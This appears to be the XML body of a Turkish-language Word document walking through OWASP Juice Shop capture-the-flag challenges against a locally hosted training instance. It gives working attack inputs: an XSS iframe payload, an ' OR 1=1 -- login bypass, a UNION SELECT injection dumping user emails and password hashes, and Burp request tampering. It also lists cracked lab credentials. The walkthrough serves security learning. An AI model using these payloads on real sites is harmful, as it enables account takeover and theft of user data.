          <w:t>https://github.com/bkimminich/juice-shop</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">  adresinde Readme.md dosyasının içerisinde belirtilen yöntemler ile kurulup çalıştırılıp; içerisinde bulunan challange lere meydan okunabilir.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE34B4" w:rsidRDefault="00CE34B4">
      <w:r>
        <w:t>Juice Shop web uygulaması içerisinde 90 adet challange bulunduruyor</w:t>
      </w:r>
      <w:r w:rsidR="00D34FA1">
        <w:t>. Bu challangel</w:t>
      </w:r>
      <w:r w:rsidR="0059551C">
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="00D34FA1">
        <w:t>r çözüldükçe site bildirimi ile meydan okuyan kişi bilgilendiriliyor.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C220DB" w:rsidRDefault="00877BD1">
      <w:r>
        <w:t xml:space="preserve">Challangeların durumunu öğrenmek için gizli ve aynı zamanda bir challange olan scoreboard </w:t>
      </w:r>
      <w:r w:rsidR="00CB5899">
        <w:t>sayfası da</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> bulunmaktadır.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B617AF" w:rsidRDefault="00B617AF">
      <w:r>
        <w:t xml:space="preserve">Ben </w:t>
      </w:r>
      <w:r w:rsidR="00664FC1">
        <w:t xml:space="preserve">Vagrant ile Juice Shop web </w:t>
      </w:r>
      <w:r w:rsidR="0019746D">
        <w:t>uygulamasını</w:t>
      </w:r>
      <w:r w:rsidR="00664FC1">
        <w:t xml:space="preserve"> çalıştırdım ve </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">çözüm esnasında Burp Suite, </w:t>
      </w:r>
      <w:r w:rsidR="00876FB0">
        <w:t xml:space="preserve">Sqlmap, </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Kali Linux VM ile </w:t>
      </w:r>
      <w:r w:rsidR="003039F6">
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:t>rowser</w:t>
      </w:r>
      <w:r w:rsidR="003039F6">
        <w:t xml:space="preserve">ın </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">web konsolunu kullandım. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B617AF" w:rsidRDefault="00B617AF" w:rsidP="00B617AF">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>Çözümler</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00772A06" w:rsidRDefault="00664FC1" w:rsidP="00664FC1">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Score Board-</w:t>
      </w:r>
      <w:r w:rsidR="0019746D">
        <w:t>---</w:t>
      </w:r>
      <w:r>
        <w:t>Find the carefully hidden 'Score Board' page.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0019746D" w:rsidRDefault="00664FC1" w:rsidP="0019746D">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidR="0019746D">
        <w:t xml:space="preserve"> sitesinin HTML kaynak kodu incelenmesi sonucu score board sayfasına ulaşıldı. </w:t>
      </w:r>
      <w:r w:rsidR="0019746D" w:rsidRPr="0019746D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>http://192.168.33.10:3000/#/score-board</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0019746D" w:rsidRDefault="0019746D" w:rsidP="0019746D">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Privacy Policy----Read our privacy policy.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00737DC6" w:rsidRDefault="0019746D" w:rsidP="0019746D">
      <w:r>
        <w:t xml:space="preserve">Site içerisinde bulunan gizlilik sözleşmesi okunduğunda challange </w:t>
      </w:r>
      <w:r w:rsidR="00737DC6">
        <w:t>tamamlanmış oldu.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00737DC6" w:rsidRDefault="00737DC6" w:rsidP="00737DC6">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Confidential Document---Access a confidential document.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00737DC6" w:rsidRDefault="00737DC6" w:rsidP="00737DC6">
      <w:r>
        <w:t>Dirb toolu ile site dizinleri araştırıldığında 200 döndürenlerin arasında /ftp dizinide bulunmaktadır.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00737DC6" w:rsidRDefault="00737DC6" w:rsidP="00737DC6">
      <w:r w:rsidRPr="00737DC6">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>http://192.168.33.10:3000/ftp/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gidildiğinde birçok dosya bulunmaktadır.Bunlardan herhangi birini örneğin </w:t>
      </w:r>
      <w:r w:rsidRPr="00737DC6">
        <w:t>"Acqutations.md" dosyasını</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> indirdiğimizde bu challange’da çözmüş oluruz.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00737DC6" w:rsidRDefault="00737DC6" w:rsidP="00737DC6">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Error Handling---Provoke an error that is neither very gracefully nor consistently handled.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00684B0D" w:rsidRDefault="00684B0D" w:rsidP="00737DC6">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Çözüm için</w:t>
      </w:r>
      <w:r w:rsidR="00C154D8">
        <w:t xml:space="preserve"> 404 hatası verdirmemiz yeterli;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> arama kutusuna tek tırnak ile herhangi bir şey yazmak yetertli olacaktır. Örneğin: </w:t>
      </w:r>
      <w:r w:rsidRPr="00684B0D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>’said</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00684B0D" w:rsidRDefault="00684B0D" w:rsidP="00684B0D">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>DOM XSS---Perform a DOM XSS attack with &lt;iframe src="javascript:alert(`xss`)"&gt;.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00684B0D" w:rsidRDefault="00684B0D" w:rsidP="00684B0D">
      <w:r>
        <w:t xml:space="preserve">Arama kutusuna  </w:t>
      </w:r>
      <w:r w:rsidRPr="00684B0D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&lt;iframe src="javascript:alert(`xss`)"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>yazmak yeterlidir.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B27F03" w:rsidRDefault="00B27F03" w:rsidP="00B27F03">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Zero Stars--Give a devastating zero-star feedback to the store.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B27F03" w:rsidRDefault="00B27F03" w:rsidP="00B27F03">
      <w:r w:rsidRPr="00B27F03">
        <w:t>"C</w:t>
      </w:r>
      <w:r>
        <w:t>ustomer Feedback</w:t>
      </w:r>
      <w:r w:rsidRPr="00B27F03">
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> sayfasına gidip</w:t>
      </w:r>
      <w:r w:rsidR="00F5118F">
        <w:t xml:space="preserve"> formu</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> rastgele doldurduktan sonra Burp aracı ile </w:t>
      </w:r>
      <w:r w:rsidR="0057362D">
        <w:t>iste</w:t>
      </w:r>
      <w:r w:rsidR="00675D85">
        <w:t>ktaki rating</w:t>
      </w:r>
      <w:r w:rsidR="00FD0941">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00675D85">
        <w:t>değerini 0 ile</w:t>
      </w:r>
      <w:r w:rsidR="0057362D">
        <w:t xml:space="preserve"> değiştirip forward edin ve challange tamam.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0057362D" w:rsidRDefault="0057362D" w:rsidP="00B27F03">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="41BBEC88" wp14:editId="7371D999">
            <wp:extent cx="5943600" cy="1889184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68672" cy="192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62D" w:rsidRDefault="0057362D" w:rsidP="00B27F03">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6870E107" wp14:editId="7AB47AF7">
            <wp:extent cx="5943600" cy="1354347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7160" cy="137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62D" w:rsidRDefault="0057362D" w:rsidP="00B27F03">
      <w:r>
        <w:t>İsteği</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0057362D" w:rsidRDefault="0057362D" w:rsidP="00B27F03">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="22272886" wp14:editId="3D0CCD79">
            <wp:extent cx="5943600" cy="1380226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1268" cy="138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3DD" w:rsidRDefault="0057362D" w:rsidP="00737DC6">
      <w:r>
        <w:t>Şekilde değiştirin ve forward edin</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E553DD" w:rsidRDefault="006F3D92" w:rsidP="006F3D92">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Login Admin--</w:t>
      </w:r>
      <w:r w:rsidR="00592FAF">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>Log in with the administrator's user account.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00172277" w:rsidRDefault="0020509E" w:rsidP="00172277">
      <w:r>
        <w:t xml:space="preserve">Login sayfasında Email ve Password kısımlarına basit bir şekilde </w:t>
      </w:r>
      <w:r w:rsidR="00F10776">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>' OR 1=1 --</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0020509E">
        <w:t>gibi basit bir manuel</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> sql injection yöntemi ile admin olarak girebilir ve challange’i tamamlarız.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0026359C" w:rsidRDefault="0026359C" w:rsidP="0026359C">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Admin Section---Access the administration section of the store.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0026359C" w:rsidRDefault="0026359C" w:rsidP="0026359C">
      <w:r>
        <w:t xml:space="preserve">Yukarıda admin olduk ve daha önce dirb ile </w:t>
      </w:r>
      <w:r w:rsidR="005161D7">
        <w:t>site dizimlerine ulaştık. “</w:t>
      </w:r>
      <w:r w:rsidR="005161D7" w:rsidRPr="005161D7">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>192.168.33.10:3000/#/administration</w:t>
      </w:r>
      <w:r w:rsidR="005161D7">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">” </w:t>
      </w:r>
      <w:r w:rsidR="005161D7">
        <w:t>adresine giderek bu challange da tamamlanır.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003A5D0D" w:rsidRDefault="003A5D0D" w:rsidP="008661C7">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008661C7" w:rsidRDefault="008661C7" w:rsidP="008661C7">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Five-Star Feedback---Get rid of all 5-star customer feedback.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008661C7" w:rsidRDefault="004A7E06" w:rsidP="008661C7">
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidR="008661C7">
        <w:t>Administration sayfasına girdikten sonra feedbacklerin arasından 5 yıldız almış olan feedback’i silersek bu challangede tamamlanır.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004A7E06" w:rsidRDefault="004A7E06" w:rsidP="004A7E06">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>View Basket---View another user's shopping basket.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004A7E06" w:rsidRDefault="004A7E06" w:rsidP="004A7E06">
      <w:r>
        <w:t>Bir kullanıcı oluşturup bu kullancı ile giriş yaptıktan sonra “Your Basket” sekmesine geçerken yapılan isteği Burp aracı ile değiştirirsek bu challange</w:t>
      </w:r>
      <w:r w:rsidR="00C25F47">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="00C25F47">
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tamamla</w:t>
      </w:r>
      <w:r w:rsidR="00C25F47">
        <w:t>nır</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00301AE9" w:rsidRDefault="00301AE9" w:rsidP="004A7E06">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="76619EE5" wp14:editId="13CA134D">
            <wp:extent cx="2676525" cy="946205"/>
            <wp:effectExtent l="0" t="0" r="0" b="635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43912" b="18575"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2676525" cy="946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E5A0F">
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="32212507" wp14:editId="2612CC26">
            <wp:extent cx="2676525" cy="800100"/>
            <wp:effectExtent l="0" t="0" r="9525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şeklinde değiştirmek yeterli olur.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB505A" w:rsidRDefault="00AB505A" w:rsidP="00AB505A">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Password Strength---Log in with the administrator's user credentials without previously changing them or applying SQL Injection.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D20961" w:rsidRDefault="00D20961" w:rsidP="00D20961">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D20961">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>Ve</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D0457" w:rsidRPr="008D0457" w:rsidRDefault="00D20961" w:rsidP="003859EF">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>User Credentials---Retrieve a list of all user credentials via SQL Injection.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F36BF8" w:rsidRDefault="00F36BF8" w:rsidP="00F36BF8">
      <w:r>
        <w:t>‘Search’ işlemi burp ile incelendiği zaman isteğin aslında /rest/api/product?q=</w:t>
      </w:r>
      <w:r w:rsidR="00876FB0">
        <w:t xml:space="preserve"> sayfasına istek yapıldığı çıkarılabilir.Bu sayfada sqlmap toolu ile test edildiğinde.Çıktı olarak;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00876FB0" w:rsidRDefault="00876FB0" w:rsidP="00876FB0">
      <w:r>
        <w:t>DBMS: SQLite</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00876FB0" w:rsidRDefault="00876FB0" w:rsidP="00876FB0">
      <w:r>
        <w:t>Database: SQLite_masterdb</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00876FB0" w:rsidRDefault="00876FB0" w:rsidP="00876FB0">
      <w:r>
        <w:t>[21 tables]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00876FB0" w:rsidRDefault="00876FB0" w:rsidP="00876FB0">
      <w:r>
        <w:t>| Addresses          || BasketItems        || Baskets            || Captchas           || Cards              || Challenges         || Complaints         || Deliveries         || Feedbacks          || ImageCaptchas      || Memories           || PrivacyRequests    || Products           || PurchaseQuantities || Quantities         || Recycles           || SecurityAnswers    || SecurityQuestions  || Users              || Wallets            || sqlite_sequence    |</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005942CB" w:rsidRDefault="005942CB" w:rsidP="005942CB">
      <w:r>
        <w:t>Table: Users</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005942CB" w:rsidRDefault="005942CB" w:rsidP="005942CB">
      <w:r>
        <w:t>[12 columns]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005942CB" w:rsidRDefault="005942CB" w:rsidP="005942CB">
      <w:r>
        <w:t xml:space="preserve">| createdAt    || deletedAt   || email        | | id           | | isActive     | | lastLoginIp  | | password     || profileImage | | role         | | totpSecret   | | updatedAt    | | username     | </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E51C4B" w:rsidRDefault="00E51C4B" w:rsidP="006F3D92"/>
    <w:p w:rsidR="00E51C4B" w:rsidRDefault="005942CB" w:rsidP="006F3D92">
      <w:r>
        <w:t xml:space="preserve">Ulaşılabilir.Daha sonra el yordamı ile </w:t>
      </w:r>
      <w:r w:rsidR="00E51C4B">
        <w:t>Products tablosundaki kolon sayısı adetini belirleyerek;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006F3D92" w:rsidRDefault="005942CB" w:rsidP="006F3D92">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005942CB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>http://192.168.33.10:3000/rest/products/search?q=said')) UNION SELECT '1', id, email, password, '5', '6', '7', '8','9' FROM Users</w:t>
      </w:r>
      <w:r w:rsidR="008D6D29">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005942CB" w:rsidRDefault="005942CB" w:rsidP="006F3D92">
      <w:r>
        <w:t>İsteği ile tüm kullanıcıların bilgilerine ulaşabiliriz.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005942CB" w:rsidRDefault="00B823AF" w:rsidP="006F3D92">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="32E2F427" wp14:editId="35665C6D">
            <wp:extent cx="5943203" cy="2611526"/>
            <wp:effectExtent l="0" t="0" r="635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3530" cy="261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04C" w:rsidRDefault="005942CB" w:rsidP="006F3D92">
      <w:r>
        <w:t>Buradan</w:t>
      </w:r>
      <w:r w:rsidR="00B3704C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:history="1">
        <w:r w:rsidR="005F6837" w:rsidRPr="005F6837">
          <w:rPr>
            <w:rStyle w:val="Kpr"/>
          </w:rPr>
          <w:t>hashkiller</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="005F6837">
        <w:t xml:space="preserve"> aracılığıyla</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005942CB" w:rsidRDefault="00B3704C" w:rsidP="006F3D92">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>email:</w:t>
      </w:r>
      <w:r w:rsidR="005942CB">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005942CB" w:rsidRPr="005942CB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>admin@juice-sh.op</w:t>
      </w:r>
      <w:r w:rsidR="005942CB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005942CB" w:rsidRPr="005942CB">
        <w:t>hash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00B3704C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B3704C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>0192023a7bbd73250516f069df18b50</w:t>
      </w:r>
      <w:r w:rsidR="005F6837">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="00B3704C">
        <w:t xml:space="preserve"> password</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00B3704C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>admin123</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3704C" w:rsidRDefault="00B3704C" w:rsidP="006F3D92">
      <w:r>
        <w:t xml:space="preserve">bilgilerine ulaşır ve login sayfasından giriş yapmamız </w:t>
      </w:r>
      <w:r w:rsidR="005F6837">
        <w:t>halinde challange tamamlanır</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A97677" w:rsidRDefault="00A97677" w:rsidP="00A97677">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Login MC SafeSearch---Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A97677" w:rsidRDefault="00A97677" w:rsidP="00A97677">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5D4516BA" wp14:editId="2B27A553">
            <wp:extent cx="5105400" cy="1562100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677" w:rsidRDefault="00A97677" w:rsidP="00A97677">
      <w:r>
        <w:t xml:space="preserve">Aynı şekilde </w:t>
      </w:r>
      <w:hyperlink r:id="rId21" w:history="1">
        <w:r w:rsidRPr="005F6837">
          <w:rPr>
            <w:rStyle w:val="Kpr"/>
          </w:rPr>
          <w:t>hashkiller</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> aracılığıyla</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A97677" w:rsidRDefault="00A97677" w:rsidP="00A97677">
      <w:r w:rsidRPr="00A97677">
        <w:t xml:space="preserve">email: </w:t>
      </w:r>
      <w:r w:rsidR="00F5511D">
        <w:t>mc.safesearch</w:t>
      </w:r>
      <w:r w:rsidRPr="00A97677">
        <w:t xml:space="preserve">@juice-sh.op hash: </w:t>
      </w:r>
      <w:r w:rsidR="00F5511D" w:rsidRPr="00F5511D">
        <w:t>b03f4b0ba8b458fa0acdc02cdb953bc8</w:t>
      </w:r>
      <w:r w:rsidRPr="00A97677">
        <w:t xml:space="preserve"> password:</w:t>
      </w:r>
      <w:r w:rsidR="00B27C41" w:rsidRPr="00B27C41">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B27C41">
        <w:t>Mr.</w:t>
      </w:r>
      <w:r w:rsidR="00167F25">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B27C41" w:rsidRPr="00B27C41">
        <w:t>N00dles</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0078132C" w:rsidRDefault="0078132C" w:rsidP="00A97677">
      <w:r w:rsidRPr="0078132C">
        <w:t>bilgilerine ulaşır ve login sayfasından giriş yapmamız halinde</w:t>
      </w:r>
      <w:r w:rsidR="004E7938">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0078132C">
        <w:t>challange</w:t>
      </w:r>
      <w:r w:rsidR="004E7938">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0078132C">
        <w:t>tamamlanır.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F72F72" w:rsidRDefault="00F72F72" w:rsidP="00F72F72">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Login Bender--</w:t>
      </w:r>
      <w:r w:rsidR="0035237B">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>Log in with Bender's user account.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F72F72" w:rsidRDefault="00F72F72" w:rsidP="00F72F72">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F72F72">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>Ve</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F72F72" w:rsidRDefault="00F72F72" w:rsidP="00F72F72">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Login Jim--</w:t>
      </w:r>
      <w:r w:rsidR="0035237B">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>Log in with Jim's user account.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F151E" w:rsidRDefault="00B40828" w:rsidP="00B40828">
      <w:r>
        <w:t>Yukar</w:t>
      </w:r>
      <w:r w:rsidR="00CC27B9">
        <w:t xml:space="preserve">ıda elde ettiğimiz email bilgileri ve parola kısmına yazacağımız </w:t>
      </w:r>
      <w:r w:rsidR="00CC27B9" w:rsidRPr="00CC27B9">
        <w:t xml:space="preserve">' OR 1=1 – </w:t>
      </w:r>
      <w:r w:rsidR="00CC27B9">
        <w:t>ile bu 2 challange’de tamamlanır.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007F151E" w:rsidRDefault="007F151E" w:rsidP="007F151E">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r w:rsidRPr="007F151E">
        <w:lastRenderedPageBreak/>
        <w:t>Forged Feedback</w:t>
      </w:r>
      <w:r>
        <w:t>---</w:t>
      </w:r>
      <w:r w:rsidRPr="007F151E">
        <w:t>Post some feedback in another users name.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B40828" w:rsidRDefault="007F151E" w:rsidP="007F151E">
      <w:r>
        <w:t>Herhangi bir kullanıcı ile giriş yaptıktan sonra</w:t>
      </w:r>
      <w:r w:rsidR="00AA1223">
        <w:t xml:space="preserve"> “Customer Feedback</w:t>
      </w:r>
      <w:r w:rsidR="00CC27B9" w:rsidRPr="00CC27B9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AA1223">
        <w:t>“ sekmesinden form’a rastgele değerler girdikten sonra Burp tool’u ile araya girerek UserId değerini değiştirmemiz challange’ı çözmek için yeterli olacaktır;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00675D85" w:rsidRDefault="00AA1223" w:rsidP="007F151E">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="02DA996E" wp14:editId="277FFE64">
            <wp:extent cx="2904134" cy="1419225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08790" cy="142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7200B93" wp14:editId="3EED1B74">
            <wp:extent cx="2939415" cy="1234440"/>
            <wp:effectExtent l="0" t="0" r="0" b="381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5123"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3109510" cy="1305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2895" w:rsidRDefault="00832895" w:rsidP="00832895">
      <w:pPr>
        <w:pStyle w:val="Balk2"/>
      </w:pPr>
      <w:r>
        <w:t>Payback Time---Place an order that makes you rich.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00832895" w:rsidRDefault="00832895" w:rsidP="00832895">
      <w:r>
        <w:t>Herhangi bir kullanıcı ile giriş yaptıktan sonra herhangi bir ürünü “Add to Basket” yaparken Burp toolu ile araya girerek quantity değerini eksi bir sayı girermemiz(örneğin: -99) ve forward etmemiz.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00832895" w:rsidRDefault="00832895" w:rsidP="00832895">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="42626412" wp14:editId="1FDCA10C">
            <wp:extent cx="2190750" cy="552450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0A58919E" wp14:editId="13BB7CC6">
            <wp:extent cx="2362200" cy="466725"/>
